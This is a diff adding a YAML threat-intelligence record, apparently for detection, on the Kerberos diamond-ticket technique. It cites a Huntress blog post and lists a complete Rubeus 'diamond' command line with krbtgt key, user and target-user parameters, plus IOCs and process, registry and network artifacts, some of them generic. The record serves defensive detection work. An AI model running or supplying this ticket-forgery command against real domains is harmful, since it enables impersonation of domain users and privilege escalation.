@@ -1,0 +1,47 @@
+description: A technique that combines a genuine AS-REQ/AS-REP or TGS-REQ/TGS-REP
+  exchange with a forged Kerberos ticket.
+attribution: Unknown
+TTPs:
+  processes:
+  - rubeus.exe
+  commandline:
+  - rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:loki /password:Mischief$
+    /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104
+    /nowrap
+  powershell:
+  - Rubeus.exe diamond /krbkey:<aes256_krbtgt_key> /user:loki /password:Mischief$
+    /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104
+    /nowrap
+  scripting_engine:
+  - Rubeus.exe
+  registry_keys:
+  - HKEY_CURRENT_USER\Software\Rubeus
+  image_load:
+  - rubeus.exe
+  network_connections:
+  - earth-dc.marvel.local
+  file_activity:
+  - C:\Windows\System32\rubeus.exe
+  persistence:
+  - Registry modification
+  pipes:
+  - Named pipe used for communication between Rubeus and the target system
+  process_relations:
+  - rubeus.exe -> earth-dc.marvel.local
+IOCs:
+- rubeus.exe diamond
+- Rubeus.exe
+- /krbkey:<aes256_krbtgt_key>
+- /user:loki
+- /password:Mischief$
+- /enctype:aes
+- /domain:marvel.local
+- /dc:earth-dc.marvel.local
+- /ticketuser:thor
+- /ticketuserid:1104
+- /nowrap
+authors:
+- Andrew Schwartz
+reference: https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket
+date_of_publication: June 25, 2025
+file_creation_date: June 26, 2025
